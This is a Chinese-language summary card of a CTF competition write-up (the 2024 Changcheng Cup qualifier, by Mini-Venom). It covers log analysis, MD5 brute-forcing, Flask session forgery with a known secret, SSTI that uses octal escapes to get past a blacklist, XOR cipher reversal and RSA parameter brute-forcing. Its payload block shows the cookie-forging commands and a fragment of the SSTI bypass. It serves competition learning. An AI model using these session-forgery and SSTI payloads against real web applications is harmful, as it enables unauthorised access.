---
title: "第四届\"长城杯\"网络安全大赛暨京津冀网络安全技能竞赛(初赛) by Mini-Venom"
category: web
tags: ["长城杯", "web", "Web-Flask-session伪造", "SSTI-8进制Unicode转义", "Re-XOR加密", "流密码XOR-反向"]
signals: ["长城杯 2024", "Web-Flask-session伪造", "SSTI-8进制Unicode转义", "Re-XOR加密", "流密码XOR-反向", "Crypto-RSA-二元二次方程爆破", "Pwn", "OAA", "Flask-session-sold", "web_unknown", "ChaMd5", "Mini-Venom", "access", "log"]
difficulty: medium
source: "https://www.ctfiot.com/204445.html"
tools: ["C", "Flask", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第四届"长城杯"网络安全大赛暨京津冀网络安全技能竞赛(初赛) by Mini-Venom

> 赛事：长城杯 2024 | 方向：web | 难度：medium | 工具：C、Flask、Python

## 一句话总结

第四届长城杯京津冀初赛(2024-09)ChaMd5 Mini-Venom:oa.access.log awk统计最频繁IP+md5爆破日志中MD5→flag+Flask session伪造(sold/inventory+SSTI 8进制Unicode转义)+流密码XOR反向+RSA二元二次方程(k1,k2)爆破+Pwn House of X

## 攻击链

1. MISC: oa.access.log awk uniq -c sort -nr 找最频繁IP|MD5爆破: md5(chr(k)) hex 字典 32-127爆破日志中MD5|Flask session伪造: decode+encode signed ''a123456''+伪造admin identity/username/ sold=600或inventory=''{{7*7}}''|SSTI8进制: ''''[''\137\137\143\154\141\163\163\137\137'']...8进制转义|逆向: argv[1][i] ^= argv[1][i+1-42*(v4/0x2A)] 循环加密|流密码反向: encoded[]从后向前 ^= encoded[xorIndices[currentIndex]]|RSA-二次方程: 已知a,b,n,c,for k1 in 0..999: A=a, B=b+k2+k1*a, C=k1*(b+k2)-n, Ax^2+Bx+C=0 求根n%p1==0|Pwn

## 关键 payload

```
cat oa.access.log|awk ''{print $1}''|uniq -c|sort -nr|md5(chr(k) for k in 32..127)|python .flask_session_cookie_manager3.py decode -s ''a123456'' -c ''COOKIE''|encode -t "{''csrf_token'': ''94c60c...'', ''identity'':''admin'', ''username'': ''admin'', ''__init__'':{''__globals__'':{''inventory'':''{{7*7}}''}}}"|{{''''[''\137\137\143\154\141\163\163\137\137'']...]|v3->m128i_i8[i] ^= v3->m128i_u8[i+1-42*(v4/0x2A)]; ++v4|for k1 in range(1000): for k2 in range(1000): A=a; B=b+k2+k1*a; C=k1*(b+k2)-n; delta = nthroot_mod(B^2-4*A*C, 2, p); p1=(-B+delta)*inverse(2*A,p)%p + k1; if n%p1==0: ...|OAA + House of ...
```

## 经验教训

1) Flask session:session_data + sold(库存)/inventory(SSTI触发)字段; 2) SSTI 8进制转义:'\137\143\154\141\163\163'对应'__class__'绕黑名单; 3) argv[1][i] ^= argv[1][i+1-42*(v4/0x2A)]:流密码异或下一字节(自步进)逆需从后向前; 4) RSA二元二次方程爆破:已知a,b,c,A=a, B=b+k2+k1*a, C=k1*(b+k2)-n,求解n%p1==0; 5) 主流密码逆:encoded[]从后向前异或xorIndices[currentIndex]

## 标签

Web-Flask-session伪造、SSTI-8进制Unicode转义、Re-XOR加密、流密码XOR-反向、Crypto-RSA-二元二次方程爆破、Pwn、OAA、Flask-session-sold

## 参考来源

- https://www.ctfiot.com/204445.html
- 原文件：第四届“长城杯”网络安全大赛暨京津冀网络安全技能竞赛（初赛）by_Mini-Venom.full.md
